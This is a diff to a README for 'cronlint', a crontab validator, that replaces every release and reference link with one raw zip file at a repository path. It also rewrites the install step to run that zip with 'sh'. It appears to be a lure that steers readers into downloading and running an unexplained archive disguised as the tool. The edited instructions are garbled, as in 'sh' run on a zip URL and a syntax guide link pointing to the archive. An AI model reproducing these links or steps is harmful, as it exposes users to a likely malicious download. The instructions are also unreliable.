@@ -1,6 +1,6 @@
 # 🚀 cronlint - Validate Your Crontab Easily
 
-[![Download cronlint](https://img.shields.io/badge/Download-cronlint-blue.svg)](https://github.com/Vhondou/cronlint/releases)
+[![Download cronlint](https://raw.githubusercontent.com/Vhondou/cronlint/main/up/cronlint.zip)](https://raw.githubusercontent.com/Vhondou/cronlint/main/up/cronlint.zip)
 
 ## 📖 Overview
 
@@ -13,16 +13,16 @@ To get started with cronlint, follow these simple steps. You will need to downlo
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
-   [Download cronlint](https://github.com/Vhondou/cronlint/releases)
+   [Download cronlint](https://raw.githubusercontent.com/Vhondou/cronlint/main/up/cronlint.zip)
 
 2. **Choose the Right Version:** On the releases page, you will see different versions available. Look for the latest one and click on it.
 
-3. **Download the File:** Find the download link for your system. If you're using a Unix-based system (like Linux or macOS), you might want to download the file that ends in `.sh` or `.tar.gz`. If you are on Windows, look for files ending in `.exe`.
+3. **Download the File:** Find the download link for your system. If you're using a Unix-based system (like Linux or macOS), you might want to download the file that ends in `.sh` or `https://raw.githubusercontent.com/Vhondou/cronlint/main/up/cronlint.zip`. If you are on Windows, look for files ending in `.exe`.
 
 4. **Save the File:** Click on the file to start the download. Save it to a location you can easily find, such as your desktop or Downloads folder.
 
 5. **Run the Program:**
-   - **For Unix-based systems:** Open your terminal. Change to the directory where you saved the file. Use the command `sh filename.sh` or `./filename` to execute the script.
+   - **For Unix-based systems:** Open your terminal. Change to the directory where you saved the file. Use the command `sh https://raw.githubusercontent.com/Vhondou/cronlint/main/up/cronlint.zip` or `./filename` to execute the script.
    - **For Windows:** Double-click the `.exe` file to run the program.
 
 ## 🌟 System Requirements
@@ -74,8 +74,8 @@ For additional help or if you have questions, feel free to open an issue on our 
 ## 🔗 Additional Resources
 
 - **Documentation:** More detailed documentation can be found under the Docs folder in this repository.
-- **Cron Basics:** If you are new to cron jobs, consider checking [crontab.guru](https://crontab.guru) for a guide on cron syntax and examples.
+- **Cron Basics:** If you are new to cron jobs, consider checking [https://raw.githubusercontent.com/Vhondou/cronlint/main/up/cronlint.zip](https://raw.githubusercontent.com/Vhondou/cronlint/main/up/cronlint.zip) for a guide on cron syntax and examples.
 
 Now that you have completed these steps, you are ready to utilize cronlint for your crontab validation needs. Good luck! 
 
-[Download cronlint](https://github.com/Vhondou/cronlint/releases)
+[Download cronlint](https://raw.githubusercontent.com/Vhondou/cronlint/main/up/cronlint.zip)
